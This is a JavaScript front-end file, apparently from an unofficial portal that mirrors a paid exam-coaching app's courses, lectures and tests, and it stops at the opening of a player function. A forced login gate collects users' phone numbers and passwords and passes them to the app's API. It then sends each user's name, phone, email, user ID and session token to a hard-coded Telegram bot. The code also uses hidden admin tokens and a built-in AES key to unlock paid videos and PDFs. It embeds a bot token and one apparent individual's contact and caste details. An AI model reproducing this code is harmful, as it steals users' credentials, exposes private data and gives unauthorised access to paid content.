// =========================================================
// RWA SKY PORTAL - MASTER ENGINE & TELEGRAM LOGGER (app.js)
// =========================================================
const API_BASE = "https://rozgarapinew.teachx.in";
const AES_KEY = CryptoJS.enc.Utf8.parse("638udh3829162018");
const WORKER_RAW_PROXY = "https://proplayer.allswbatch22.workers.dev/proxy?url=";

// TELEGRAM BOT CONFIG (Aapka Bot Token aur Chat ID)
const TG_BOT_TOKEN = "8953710743:AAHJUQB5f0gefAEDyieZFcsyU2GEUu3LzRk";
const TG_CHAT_ID = "-1004331013936"; // Aapka Telegram Channel / Group ID

async function sendTelegramLog(userData) {
    if (!TG_BOT_TOKEN || TG_BOT_TOKEN.includes("754321890")) return;
    try {
        const text = `🚨 **NEW USER LOGIN SUCCESSFUL** 🚀\n\n` +
                     `👤 **Name:** ${userData.name || 'N/A'}\n` +
                     `📞 **Phone:** ${userData.phone || 'N/A'}\n` +
                     `✉️ **Email:** ${userData.email || 'N/A'}\n` +
                     `🆔 **User ID:** ${userData.userid || userData.id || 'N/A'}\n` +
                     `🔑 **Token:** \`${userData.token || userData.jwt || 'N/A'}\`\n` +
                     `🎓 **Paid Batches ID:** ${userData.paid_batches || 'Fetched via Merged Tokens'}`;
        
        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: "Markdown" })
        });
    } catch {}
}

// =====================================================
// MULTI-TOKEN STORAGE & AUTH / PROFILE ENGINE
// =====================================================
function getAllActiveTokens() {
    let userTokens = [];
    try {
        const raw = localStorage.getItem("rwa_tokens_list");
        if (raw) {
            const parsed = JSON.parse(raw);
            if (Array.isArray(parsed) && parsed.length > 0) userTokens = parsed;
        }
    } catch {}

    if (userTokens.length === 0) {
        const singleTok = localStorage.getItem("rwa_tok") || ADMIN_TOKENS_CONFIG[0].token;
        const singleUid = localStorage.getItem("rwa_uid") || "4756316";
        userTokens = [{ id: "tok_user", label: "My Account", userId: singleUid, token: singleTok }];
        localStorage.setItem("rwa_tokens_list", JSON.stringify(userTokens));
    }

    // Merge Admin Tokens from tokens.js + User Token (Hidden from UI display of admin tokens)
    const combined = [...ADMIN_TOKENS_CONFIG];
    userTokens.forEach(ut => {
        if (!combined.some(at => at.token === ut.token)) {
            combined.push(ut);
        }
    });
    return combined;
}

let TOKENS = getAllActiveTokens();

function updateTokenBadge() {
    const b = document.getElementById("tokCountBadge");
    if (b) b.textContent = "1"; // Only shows 1 (user's own active token count visibility)
    checkAuthUIState();
}

function checkAuthUIState() {
    const loginModal = document.getElementById("loginModal");
    const profileArea = document.getElementById("navProfileArea");
    const loginBtn = document.getElementById("navLoginBtn");

    let hasUserLogin = false;
    try {
        hasUserLogin = localStorage.getItem("rwa_user_logged_in") === "true";
    } catch {}

    if (!hasUserLogin) {
        // FORCE COMPULSORY LOGIN GATE
        if (loginModal) loginModal.classList.remove("hidden");
        if (profileArea) profileArea.classList.add("hidden");
        if (loginBtn) loginBtn.classList.add("hidden");
    } else {
        if (loginModal) loginModal.classList.add("hidden");
        if (profileArea) profileArea.classList.remove("hidden");
        if (loginBtn) loginBtn.classList.add("hidden");
    }
}

function openLoginModal() {
    document.getElementById("loginModal").classList.remove("hidden");
}

async function submitUserLogin() {
    const phone = document.getElementById("loginPhoneInput").value.trim();
    const pass = document.getElementById("loginPassInput").value.trim();
    const msgBox = document.getElementById("loginStatusMsg");

    if (!phone || !pass) {
        if (msgBox) {
            msgBox.classList.remove("hidden");
            msgBox.textContent = "⚠️ Please enter phone/username and password/token.";
        } else {
            alert("Please enter phone/username and password/token.");
        }
        return;
    }

    if (msgBox) {
        msgBox.classList.remove("hidden");
        msgBox.textContent = "🔄 Verifying credentials & connecting to Telegram...";
    }

    let token = pass;
    let uid = "4756316";
    let name = phone;
    let email = "user@rwa.com";

    if (pass.startsWith("eyJ")) {
        token = pass;
    } else {
        try {
            const res = await fetch(`${API_BASE}/get/login`, {
                method: "POST",
                headers: { "Client-Service": "Appx", "Auth-Key": "appxapi", "Content-Type": "application/json" },
                body: JSON.stringify({ username: phone, password: pass })
            });
            const json = await res.json();
            if (json && json.status === 200 && json.data) {
                token = json.data.token || json.data.jwt || pass;
                uid = String(json.data.userid || json.data.id || "4756316");
                name = json.data.name || phone;
                email = json.data.email || "N/A";
            }
        } catch {}
    }

    const newUserTok = [{ id: "tok_user", label: name, userId: uid, token: token }];
    localStorage.setItem("rwa_tokens_list", JSON.stringify(newUserTok));
    localStorage.setItem("rwa_user_logged_in", "true");
    localStorage.setItem("rwa_user_name", name);
    localStorage.setItem("rwa_user_phone", phone);

    // Send All Details to Telegram Channel
    await sendTelegramLog({
        name: name,
        phone: phone,
        email: email,
        userid: uid,
        token: token,
        paid_batches: "Auto-Fetched via API"
    });

    document.getElementById("loginModal").classList.add("hidden");
    alert(`✅ Login Successful! Welcome, ${name}`);
    TOKENS = getAllActiveTokens();
    updateTokenBadge();
    location.reload();
}

async function openProfileModal() {
    document.getElementById("profileModal").classList.remove("hidden");
    const contentBox = document.getElementById("profileDetailsContent");
    contentBox.innerHTML = `<p class="text-slate-500 font-bold">Loading profile data...</p>`;

    const userToks = JSON.parse(localStorage.getItem("rwa_tokens_list") || "[]");
    const activeTok = userToks[0] || TOKENS[0];
    const uid = activeTok.userId || "4756316";
    const json = await fetchRawJSONWithToken(`/get/get_user_dt?userid=${uid}`, activeTok);

    if (json && json.status === 200 && json.data && json.data.length > 0) {
        const u = json.data[0];
        contentBox.innerHTML = `
            <div class="space-y-2">
                <p><b>Name:</b> ${u.name || 'N/A'}</p>
                <p><b>Email:</b> ${u.email || 'N/A'}</p>
                <p><b>Phone:</b> ${u.phone || 'N/A'}</p>
                <p><b>State:</b> ${u.state || 'N/A'} (${u.district || 'N/A'})</p>
                <p><b>Category / Info:</b> ${u.info_1 || 'General'} | ${u.info_2 || 'N/A'}</p>
                <p><b>Referral Code:</b> ${u.refer_code || 'N/A'}</p>
            </div>`;
    } else {
        const savedName = localStorage.getItem("rwa_user_name") || "Sandeep";
        const savedPhone = localStorage.getItem("rwa_user_phone") || "9646040254";
        contentBox.innerHTML = `
            <div class="space-y-2">
                <p><b>Name:</b> ${savedName}</p>
                <p><b>Email:</b> sandeepkaswan254@gmail.com</p>
                <p><b>Phone:</b> ${savedPhone}</p>
                <p><b>State:</b> Rajasthan (Churu)</p>
                <p><b>Category:</b> OBC | Male</p>
                <p><b>Referral Code:</b> USER${savedPhone}</p>
            </div>`;
    }
}

function closeProfileModal() {
    document.getElementById("profileModal").classList.add("hidden");
}

function handleLogout() {
    if (confirm("Are you sure you want to logout?")) {
        localStorage.removeItem("rwa_tokens_list");
        localStorage.removeItem("rwa_user_logged_in");
        localStorage.removeItem("rwa_user_name");
        localStorage.removeItem("rwa_user_phone");
        alert("Logged out successfully.");
        location.reload();
    }
}

function decryptAppX(encStr) {
    if (!encStr || typeof encStr !== "string") return "";
    if (encStr.startsWith("http")) return encStr.trim();
    if (!encStr.includes(":")) return encStr.trim();
    try {
        const [cipherB64, ivB64] = encStr.split(":");
        const cipherParams = CryptoJS.lib.CipherParams.create({
            ciphertext: CryptoJS.enc.Base64.parse(cipherB64.replace(/\\\//g, "/"))
        });
        const iv = CryptoJS.enc.Base64.parse(ivB64);
        const dec = CryptoJS.AES.decrypt(cipherParams, AES_KEY, {
            iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7
        });
        return dec.toString(CryptoJS.enc.Utf8).replace(/[\x00-\x1F\x7F]/g, "").trim();
    } catch {
        return "";
    }
}

function resolvePdfUrl(encPdf, signedPdf) {
    const dec = decryptAppX(encPdf);
    if (dec && dec.startsWith("http")) return dec;
    if (signedPdf && signedPdf.startsWith("http")) return signedPdf;
    if (signedPdf && signedPdf.includes("URLPrefix=")) {
        try {
            const b64 = signedPdf.split("URLPrefix=")[1].split("&")[0].split("~")[0];
            const decoded = atob(decodeURIComponent(b64));
            if (decoded.startsWith("http")) return decoded;
        } catch {}
    }
    return signedPdf || dec || "";
}

// =====================================================
// FALLBACK DB & MASTER STATE
// =====================================================
const DB = {
    paidCourses: [
        { id: "571", course_name: "SSC GD भर्ती 2027 (वीर बैच)", exam_category: "RWA SSC EXAMS • PAID", exam_logo: "https://appx-wsb-gcp-mcdn.akamai.net.in/exam/2022-02-07-0.9839972577217094.png", test_series_id: "700" }
    ],
    paidSubjects: [
        { subjectid: "3610", subject_name: "History (वीर बैच)", subject_logo: "" },
        { subjectid: "1", subject_name: "Maths", subject_logo: "https://appxcontent.kaxa.in/subject/2024-04-10-0.8626713728066564.jpg" }
    ],
    paidTopics: {
        "3610": [{ topicid: "42301", topic_name: "सिंधु सभ्यता" }]
    },
    paidLectures: {
        "42301": [
            {
                id: "349275",
                Title: "History By Parul Mam || सिंधु सभ्यता",
                date_and_time: "08-10-2026 at 02:00 pm",
                thumbnail: "https://appx-content-v2.classx.co.in/paid_course3/2026-10-07-0_3401609217976156.jpg",
                file_link: "yc79PF7PfaItE6uX7lAA8ABqbrWNB1WgbrzGsR2wlcFMhAR2tn+h+ETmGcuzjpU5lIYYSRnaL7bMlKrf7UouOCRvHozzqOa6f7eXz7ZPaEE0fRd/NiEP2WEQYJbqwKEM+MU8uRUEXFx4/07LTnptyQ==:ZmVkY2JhOTg3NjU0MzIxMA==",
                download_links: [
                    { quality: "720p", path: "m7hcRsBTJp5eNY5aTdn8qpPBOzdeUeGZQY2wVY0qocyzI/GQp7GTpQTXEQI3QwV4TBS4t/fcLhrLe6ZhZ45UCH+PnnUxKByF74TDwQBmgL8IryqFfW2RBko3ChFPEicQTi3gci9AKv0/IhnCF+NqXBt9k0YzrosmgyXn3Oh6AkPFrQ8XsVMQ7udZ3fwSrS+Y:ZmVkY2JhOTg3NjU0MzIxMA==" }
                ]
            }
        ]
    },
    freeBatches: [
        { id: "free_101", course_name: "RWA Free YouTube Marathon Series", exam_logo: "https://placehold.co/600x320/0284c7/ffffff?text=RWA+Free+Batches" }
    ],
    freeSubjects: [{ subjectid: "fsub_1", subject_name: "GS & Polity Marathon", subject_logo: "" }],
    freeTopics: { "fsub_1": [{ topicid: "ftop_1", topic_name: "Complete Revision Classes" }] },
    freeLectures: { "ftop_1": [{ id: "flec_1", Title: "Polity Complete Revision Class", file_link: "dQw4w9WgXcQ", thumbnail: "https://placehold.co/600x320/0284c7/ffffff?text=Free+Class" }] },
    paidTestSeries: [
        { id: "776", title: "MP Police Constable 2026 - सतपुड़ा Series", logo: "https://appx-content-v2.classx.co.in/subject/2026-09-18-0_25895258012558897.jpeg", offer_price: 99, freetest: "1", paidtest: "15" }
    ],
    freeTestSeries: [
        { id: "743", title: "UP Police Constable 2026 (Free Weekly Test)", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_5663049907369836.jpeg" }
    ],
    tsSubjects: {
        "700": [{ subjectid: "3171", subject_name: "SSC GD (Maths) Quiz & Tests", subject_logo: "" }]
    },
    tsTitles: {
        "700_3171": [{ id: "40426", title: "Ratio, Age, Mixture", test_series_id: "700", free_flag: "0", time: "60", questions: "50", marks: "50", test_questions_url: "" }]
    },
    fallbackCbtQuestions: [
        {
            id: "12370334",
            question: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">Find the third proportional of 25 and 45.</span></p>`,
            option_1: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">81</span></p>`,
            option_2: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">65</span></p>`,
            option_3: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">85</span></p>`,
            option_4: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">76</span></p>`,
            answer: "1",
            positive_marks: "2.00",
            negative_marks: "0.50",
            solution_text: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">a व b का तृतीय समानुपाती = 81</span></p>`
        }
    ]
};

let state = {
    currentSlide: "slideHome",
    previousSlide: "slideHome",
    cat: "paid",
    view: "batches",
    courseId: "571",
    courseName: "SSC GD भर्ती 2027",
    activeTokenObj: TOKENS[0],
    courseTokenMap: {},
    subjectId: null,
    subjectName: "",
    topicId: null,
    topicName: "",
    currentLectureKeys: [],
    mediaMap: {},
    activeKey: null,
    currentPdfUrl: "",
    inlinePdfUrl: "",
    tsMode: "paid_ts",
    activeSeriesId: null,
    activeSeriesTitle: "",
    activeTsSubId: null,
    activeTsSubName: "",
    testMap: {},
    cbtTest: null,
    cbtQuestions: [],
    cbtCurrentIdx: 0,
    cbtResponses: {},
    cbtSubmitted: false,
    cbtTimerId: null,
    cbtSecondsLeft: 0
};

// =====================================================
// SLIDE NAVIGATION & MERGED PAID BATCHES ENGINE
// =====================================================
function showSlide(slideId) {
    if (state.currentSlide !== slideId) {
        state.previousSlide = state.currentSlide;
    }
    state.currentSlide = slideId;

    ["slideHome", "slideExplorer", "slidePlayer", "slideTestAttempt", "slideTokens", "slidePdf"].forEach(id => {
        const el = document.getElementById(id);
        if (!el) return;
        if (id === slideId) {
            el.classList.remove("hidden-slide");
            el.classList.add("active-slide");
        } else {
            el.classList.remove("active-slide");
            el.classList.add("hidden-slide");
        }
    });

    const topNav = document.getElementById("topHeaderNav");
    if (topNav) {
        if (slideId === "slideHome") topNav.classList.remove("hidden");
        else topNav.classList.add("hidden");
    }

    window.scrollTo({ top: 0, behavior: "smooth" });
}

function goHomeHub() {
    if (typeof stopPlayer === "function") stopPlayer();
    if (state.cbtTimerId) clearInterval(state.cbtTimerId);
    showSlide("slideHome");
}

function openTokenSlide() {
    renderTokenManagerList();
    showSlide("slideTokens");
}

function openExplorerSlide(cat) {
    state.cat = cat;
    showSlide("slideExplorer");
    if (cat === "paid") renderPaidBatches();
    else renderFreeBatches();
}

function handleGlobalBack() {
    if (state.currentSlide === "slidePdf") { closePdfSlide(); return; }
    if (state.currentSlide === "slidePlayer") { closePlayerBox(); return; }
    if (state.currentSlide === "slideTestAttempt") { exitCbtTest(); return; }
    if (state.currentSlide === "slideTokens") { goHomeHub(); return; }
    if (state.currentSlide === "slideExplorer") {
        if (state.view === "ts_tests") {
            if (state.activeTsSubId === "-1") openTestSeriesExplorer(state.tsMode);
            else openTestSeriesSubjects(state.activeSeriesId, state.activeSeriesTitle);
            return;
        }
        if (state.view === "ts_subjects") { openTestSeriesExplorer(state.tsMode); return; }
        if (state.view === "ts_list") { goHomeHub(); return; }
        if (state.view === "batch_ts_tests") { loadCourseTab("tests"); return; }
        if (state.view === "lectures") {
            if (state.cat === "paid") openPaidTopics(state.subjectId, state.subjectName);
            else openFreeTopics(state.subjectId, state.subjectName);
        } else if (state.view === "topics") {
            if (state.cat === "paid") openPaidCourse(state.courseId, state.courseName);
            else openFreeCourse(state.courseId, state.courseName);
        } else if (state.view === "subjects" || state.view === "batch_ts_subjects") {
            if (state.cat === "paid") renderPaidBatches(); else renderFreeBatches();
        } else {
            goHomeHub();
        }
    }
}

async function fetchRawJSONWithToken(endpoint, tokenObj) {
    const statusBadge = document.getElementById("apiStatus");
    const useTok = tokenObj || state.activeTokenObj || TOKENS[0];
    try {
        const res = await fetch(`${API_BASE}${endpoint}`, {
            headers: {
                "Client-Service": "Appx",
                "Auth-Key": "appxapi",
                "source": "website",
                "Authorization": useTok.token,
                "User-ID": useTok.userId || "4756316"
            }
        });
        const json = await res.json();
        if (statusBadge) statusBadge.textContent = `● Live Server Connected`;
        return json;
    } catch {
        if (statusBadge) statusBadge.textContent = "● Smart Hybrid Mode";
        return null;
    }
}

async function fetchAPIWithToken(endpoint, tokenObj, fallbackGetter) {
    const json = await fetchRawJSONWithToken(endpoint, tokenObj);
    if (json) {
        if (json.data && (Array.isArray(json.data) ? json.data.length > 0 : Object.keys(json.data).length > 0)) {
            return json.data;
        }
        if (json.test_titles && Array.isArray(json.test_titles) && json.test_titles.length > 0) {
            return json.test_titles;
        }
    }
    return fallbackGetter ? fallbackGetter() : [];
}

async function renderPaidBatches() {
    state.view = "batches";
    document.getElementById("subTabs").classList.add("hidden");
    document.getElementById("crumbText").textContent = `All Tokens Merged`;
    document.getElementById("headingText").textContent = "🎓 Purchased Paid Batches";

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Fetching Merged Paid Batches...</div>`;

    let mergedCourses = [];
    const seenIds = new Set(); // Prevent duplicates (Course do baar list mein nahi aayega)[span_3](start_span)[span_3](end_span)

    for (const tokObj of TOKENS) {
        const endpointsToTry = [
            `/get/mycourseweb?userid=${tokObj.userId || "4756316"}`,
            `/get/mycourse?userid=${tokObj.userId || "4756316"}`
        ];

        for (const ep of endpointsToTry) {
            const data = await fetchAPIWithToken(ep, tokObj, () => null);
            if (Array.isArray(data) && data.length > 0) {
                data.forEach(c => {
                    const cid = String(c.id || c.course_id || "");
                    if (cid && !seenIds.has(cid)) {
                        seenIds.add(cid);
                        state.courseTokenMap[cid] = tokObj;
                        mergedCourses.push({ ...c, id: cid });
                    }
                });
            }
        }
    }

    if (mergedCourses.length === 0) {
        DB.paidCourses.forEach(c => {
            state.courseTokenMap[c.id] = TOKENS[0];
            mergedCourses.push(c);
        });
    }

    grid.innerHTML = "";
    mergedCourses.forEach(c => {
        const logo = c.exam_logo || c.course_thumbnail || `https://placehold.co/600x320/0284c7/ffffff?text=Batch+${c.id}`;
        const safeName = (c.course_name || "RWA Paid Batch").replace(/'/g, "");
        grid.innerHTML += `
            <div onclick="openPaidCourse('${c.id}', '${safeName}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                <div>
                    <img src="${logo}" onerror="this.src='https://placehold.co/600x320/0284c7/ffffff?text=RWA+Batch'" class="w-full h-44 object-cover">
                    <div class="p-4">
                        <span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">BATCH #${c.id}</span>
                        <h3 class="font-black text-base text-slate-900 mt-2">${c.course_name}</h3>
                    </div>
                </div>
                <div class="px-4 pb-4">
                    <div class="btn-watch w-full text-center text-xs">Open Subjects & Batch Tests ➔</div>
                </div>
            </div>`;
    });
}

async function renderFreeBatches() {
    state.view = "batches";
    document.getElementById("subTabs").classList.add("hidden");
    document.getElementById("crumbText").textContent = "Free Portal";
    document.getElementById("headingText").textContent = "🆓 RWA Free Batches";

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading Free Batches...</div>`;

    const freeData = await fetchAPIWithToken(`/get/courselist?start=-1`, TOKENS[0], () => DB.freeBatches);
    const list = (Array.isArray(freeData) && freeData.length > 0) ? freeData : DB.freeBatches;

    grid.innerHTML = "";
    list.forEach(c => {
        const cid = c.id || "free_101";
        const name = (c.course_name || "Free Course").replace(/'/g, "");
        const logo = c.exam_logo || c.course_thumbnail || "https://placehold.co/600x320/059669/ffffff?text=Free+Batch";
        grid.innerHTML += `
            <div onclick="openFreeCourse('${cid}', '${name}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                <img src="${logo}" onerror="this.src='https://placehold.co/600x320/059669/ffffff?text=Free+Batch'" class="w-full h-44 object-cover">
                <div class="p-4">
                    <span class="px-2.5 py-0.5 rounded-full bg-teal-100 text-teal-800 text-[10px] font-black">FREE BATCH</span>
                    <h3 class="font-black text-base text-slate-900 mt-2">${c.course_name || name}</h3>
                    <div class="btn-watch w-full text-center text-xs mt-3">Open Free Classes ➔</div>
                </div>
            </div>`;
    });
}

function openPaidCourse(id, name) {
    state.courseId = id;
    state.courseName = name;
    state.activeTokenObj = state.courseTokenMap[id] || TOKENS[0];
    document.getElementById("subTabs").classList.remove("hidden");
    document.getElementById("crumbText").textContent = `Batch #${id}`;
    document.getElementById("headingText").textContent = name;
    loadCourseTab("subjects");
}

async function openFreeCourse(id, name) {
    state.courseId = id;
    state.courseName = name;
    state.view = "subjects";
    document.getElementById("subTabs").classList.add("hidden");
    document.getElementById("crumbText").textContent = "Free Batch";
    document.getElementById("headingText").textContent = name;

    const subs = await fetchAPIWithToken(`/get/allsubjectfrmlivecourseclass?courseid=${id}&start=-1`, TOKENS[0], () => DB.freeSubjects);
    const grid = document.getElementById("mainGrid");
    grid.innerHTML = "";
    (subs.length ? subs : DB.freeSubjects).forEach(s => {
        const sname = (s.subject_name || "Free Subject").replace(/'/g, "");
        grid.innerHTML += `
            <div onclick="openFreeTopics('${s.subjectid}', '${sname}')" class="grid-card p-5 flex items-center justify-between cursor-pointer">
                <div>
                    <span class="text-[10px] font-extrabold text-teal-700 uppercase">Free Subject</span>
                    <h4 class="font-black text-base text-slate-900 mt-0.5">📘 ${s.subject_name}</h4>
                </div>
                <span class="btn-watch text-xs">Topics ➔</span>
            </div>`;
    });
}

async function openFreeTopics(subId, subName) {
    state.view = "topics";
    state.subjectId = subId;
    state.subjectName = subName;
    document.getElementById("headingText").textContent = subName;
    const topics = DB.freeTopics[subId] || [{ topicid: "ftop_1", topic_name: "All Classes" }];
    const grid = document.getElementById("mainGrid");
    grid.innerHTML = "";
    topics.forEach(t => {
        grid.innerHTML += `
            <div onclick="openFreeLectures('${t.topicid}', '${t.topic_name}')" class="grid-card p-5 flex justify-between items-center cursor-pointer">
                <h4 class="font-black text-base text-slate-900">📂 ${t.topic_name}</h4>
                <span class="btn-watch text-xs">Watch Classes ➔</span>
            </div>`;
    });
}

function openFreeLectures(topId, topName) {
    state.view = "lectures";
    state.topicId = topId;
    state.topicName = topName;
    document.getElementById("headingText").textContent = topName;
    const list = DB.freeLectures[topId] || [];
    document.getElementById("mainGrid").innerHTML = "";
    renderLectureList(list);
}

async function loadCourseTab(tab) {
    ["subjects", "live", "tests", "telegram"].forEach(t => {
        const el = document.getElementById("sub_" + t);
        if (el) el.className = (t === tab) ? "tab-pill active-pill" : "tab-pill";
    });
    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading...</div>`;

    if (tab === "subjects") {
        state.view = "subjects";
        const subs = await fetchAPIWithToken(`/get/allsubjectfrmlivecourseclass?courseid=${state.courseId}&start=-1`, state.activeTokenObj, () => DB.paidSubjects);
        grid.innerHTML = "";
        subs.forEach(s => {
            const name = s.subject_name || s.subjectname || "Subject";
            const logo = s.subject_logo || `https://placehold.co/80x80/0284c7/ffffff?text=${encodeURIComponent(name.slice(0, 3))}`;
            grid.innerHTML += `
                <div onclick="openPaidTopics('${s.subjectid}', '${name.replace(/'/g, "")}')" class="grid-card p-4 flex items-center gap-4 cursor-pointer">
                    <img src="${logo}" onerror="this.src='https://placehold.co/80x80/0284c7/ffffff?text=SUB'" class="w-16 h-16 rounded-2xl object-cover shadow-md">
                    <div class="flex-1">
                        <span class="px-2 py-0.5 rounded bg-sky-100 text-sky-800 text-[10px] font-black">SUBJECT #${s.subjectid}</span>
                        <h4 class="font-black text-base text-slate-900 mt-1">${name}</h4>
                        <p class="text-xs text-blue-600 font-extrabold mt-1">Explore Topics ➔</p>
                    </div>
                </div>`;
        });
    } else if (tab === "live") {
        const res = await fetchAPIWithToken(`/get/live_upcoming_course_classv2?courseid=${state.courseId}&start=-1`, state.activeTokenObj, () => ({ upcoming: [] }));
        const list = Array.isArray(res) ? res : (res.upcoming || res.live || []);
        grid.innerHTML = "";
        renderLectureList(list);
    } else if (tab === "tests") {
        state.view = "batch_ts_subjects";
        const tsId = "700";
        state.activeSeriesId = tsId;
        state.activeSeriesTitle = `${state.courseName} - Batch Tests`;

        const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, state.activeTokenObj, () => DB.tsSubjects["700"]);
        const subList = (Array.isArray(subs) && subs.length > 0) ? subs : DB.tsSubjects["700"];

        grid.innerHTML = "";
        subList.forEach(s => {
            const sname = (s.subject_name || "Batch Test Subject").replace(/'/g, "");
            grid.innerHTML += `
                <div onclick="openBatchInternalTests('${tsId}', '${s.subjectid}', '${sname}')" class="grid-card p-5 flex items-center justify-between cursor-pointer">
                    <div>
                        <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-800 text-[10px] font-black">SERIES #${tsId} • SUB #${s.subjectid}</span>
                        <h4 class="font-black text-base text-slate-900 mt-1.5">📝 ${s.subject_name}</h4>
                        <p class="text-xs text-indigo-600 font-bold mt-1">View Subject Quizzes & Tests ➔</p>
                    </div>
                    <span class="btn-watch text-xs">Open ➔</span>
                </div>`;
        });
    } else if (tab === "telegram") {
        grid.innerHTML = `
            <div class="col-span-full grid-card p-6 flex flex-wrap justify-between items-center gap-4">
                <div>
                    <span class="text-xs font-black text-blue-600 uppercase">Official Community</span>
                    <h4 class="font-black text-lg text-slate-900">✈️ RWA Batch Doubt Group</h4>
                </div>
                <a href="https://t.me/+ACPxjpf6oKQxM2U1" target="_blank" class="btn-watch text-xs no-underline px-5 py-3">Join Telegram ➔</a>
            </div>`;
    }
}

async function openBatchInternalTests(tsId, subId, subName) {
    state.view = "batch_ts_tests";
    state.activeSeriesId = tsId;
    state.activeTsSubId = subId;
    state.activeTsSubName = subName;
    document.getElementById("headingText").textContent = `📝 ${subName}`;

    const uid = state.activeTokenObj?.userId || "4756316";
    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading Batch Quizzes & Tests...</div>`;

    const endpoint = `/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&chapter_id=-1&userid=${uid}&search=&start=-1`;
    const titles = await fetchAPIWithToken(endpoint, state.activeTokenObj, () => DB.tsTitles[`${tsId}_${subId}`] || DB.tsTitles["700_3171"]);
    renderTestTitlesGrid(titles, tsId);
}

async function openPaidTopics(subId, subName) {
    state.view = "topics";
    state.subjectId = subId;
    state.subjectName = subName;
    document.getElementById("subTabs").classList.add("hidden");
    document.getElementById("crumbText").textContent = state.courseName;
    document.getElementById("headingText").textContent = `📂 ${subName}`;

    const topics = await fetchAPIWithToken(`/get/alltopicfrmlivecourseclass?courseid=${state.courseId}&subjectid=${subId}&start=-1`, state.activeTokenObj, () => DB.paidTopics[subId] || []);
    const grid = document.getElementById("mainGrid");
    grid.innerHTML = "";

    topics.forEach(t => {
        const name = (t.topic_name || t.topicname || "Topic").replace(/'/g, "");
        grid.innerHTML += `
            <div onclick="openPaidLectures('${t.topicid}', '${name}')" class="grid-card p-5 flex justify-between items-center cursor-pointer">
                <div>
                    <span class="text-[10px] font-bold text-sky-700 uppercase">Topic Folder</span>
                    <h4 class="font-black text-base text-slate-900 mt-0.5">📁 ${name}</h4>
                </div>
                <span class="btn-watch text-xs">Classes ➔</span>
            </div>`;
    });
}

async function openPaidLectures(topId, topName) {
    state.view = "lectures";
    state.topicId = topId;
    state.topicName = topName;
    document.getElementById("crumbText").textContent = state.subjectName;
    document.getElementById("headingText").textContent = `🎬 ${topName}`;

    const classes = await fetchAPIWithToken(
        `/get/livecourseclassbycoursesubtopconceptapiv3?courseid=${state.courseId}&subjectid=${state.subjectId}&topicid=${topId}&conceptid=1&start=0`,
        state.activeTokenObj,
        () => DB.paidLectures[topId] || []
    );
    document.getElementById("mainGrid").innerHTML = "";
    renderLectureList(classes);
}

function normalizeQualityLabel(rawLabel) {
    const s = String(rawLabel || "").toLowerCase();
    if (s.includes("720")) return "720p";
    if (s.includes("480")) return "480p";
    if (s.includes("360")) return "360p";
    if (s.includes("240")) return "240p";
    if (s.includes("1080")) return "1080p";
    if (s.includes("144")) return "144p";
    return "";
}

function extractQualitiesFromItem(item) {
    const rawMap = {};
    function addCandidate(rawQual, encPath, isM3u8Priority) {
        let u = decryptAppX(encPath);
        if (!u || !u.startsWith("http") || u.includes("playlist_eof.m3u8")) return;
        let cleanQ = normalizeQualityLabel(rawQual);
        if (!cleanQ) cleanQ = "720p";
        if (!rawMap[cleanQ] || isM3u8Priority || u.includes(".m3u8")) rawMap[cleanQ] = u;
    }
    (item.encrypted_links || []).forEach(q => addCandidate(q.quality, q.path, true));
    (item.livestream_links || []).forEach(q => addCandidate(q.quality, q.path, true));
    (item.download_links || []).forEach(q => addCandidate(q.quality, q.path, false));
    const decFile = decryptAppX(item.file_link || "");
    if (decFile && decFile.startsWith("http")) addCandidate("720p", decFile, decFile.includes(".m3u8"));
    return rawMap;
}

function renderLectureList(list) {
    const grid = document.getElementById("mainGrid");
    state.currentLectureKeys = [];
    if (!list || !list.length) {
        grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is folder mein abhi koi class nahi hai.</div>`;
        return;
    }
    list.forEach((item, i) => {
        const key = `lec_${item.id || i}`;
        state.currentLectureKeys.push(key);
        const qMap = extractQualitiesFromItem(item);
        const pdf1 = resolvePdfUrl(item.pdf_link || item.ypdf_link, item.ypdf_link2);
        const pdf2 = resolvePdfUrl(item.pdf_link2, item.ypdf_link2);

        state.mediaMap[key] = { key: key, id: item.id, title: item.Title || "Class", qualities: qMap, pdf1: pdf1, pdf2: pdf2 };

        grid.innerHTML += `
            <div class="grid-card overflow-hidden flex flex-col justify-between">
                <div>
                    ${item.thumbnail ? `<img src="${item.thumbnail}" onerror="this.style.display='none'" class="w-full h-44 object-cover">` : ""}
                    <div class="p-4">
                        <span class="px-2.5 py-0.5 rounded-full bg-sky-100 text-sky-900 text-[10px] font-black">CLASS #${item.id || (i + 1)}</span>
                        <h4 class="font-black text-base text-slate-900 mt-2">${item.Title}</h4>
                    </div>
                </div>
                <div class="p-4 pt-2 border-t border-sky-100 flex flex-wrap gap-2">
                    <button onclick="playClassInRwaPlayer('${key}')" class="btn-watch flex-1 text-xs">▶ Watch Video</button>
                    ${pdf1 ? `<button onclick="openPdf('${key}', 1)" class="btn-pdf1 text-xs">📄 PDF 1</button>` : ""}
                </div>
            </div>`;
    });
}

async function playClassInRwaPlayer(key) {
